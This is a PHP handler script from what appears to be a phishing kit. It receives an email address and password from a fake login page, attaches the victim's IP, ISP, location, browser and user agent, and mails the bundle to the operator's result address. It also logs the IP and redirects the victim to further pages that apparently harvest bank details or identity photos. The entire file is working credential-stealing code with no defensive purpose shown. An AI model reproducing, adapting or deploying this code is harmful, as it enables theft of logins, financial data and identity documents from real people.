<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['email'] == "") {
	exit();
}
$ip = getUserIP(); 
$message  = "#--------------------[ EMAIL LOGIN ]-------------------------#\n";
$message .= "User ID		: ".$_POST['email']."\n";
$message .= "Password		: ".$_POST['password']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$subject = "TEMBUS EMAIL: ".$_POST['email']." [ $cn - $os - $ip ]";
kirim_mail($setting['email_result'], $_SESSION['from'], $subject, $message);
tulis_file("../result/total_email.txt", $ip);
if($setting['get_bank'] == "on"){
 echo "<script type='text/javascript'>window.top.location='bank?key=$key';</script>";
}else if($setting['get_photo'] == "on"){
 echo "<script type='text/javascript'>window.top.location='identity?key=$key';</script>";
}else{
echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";
}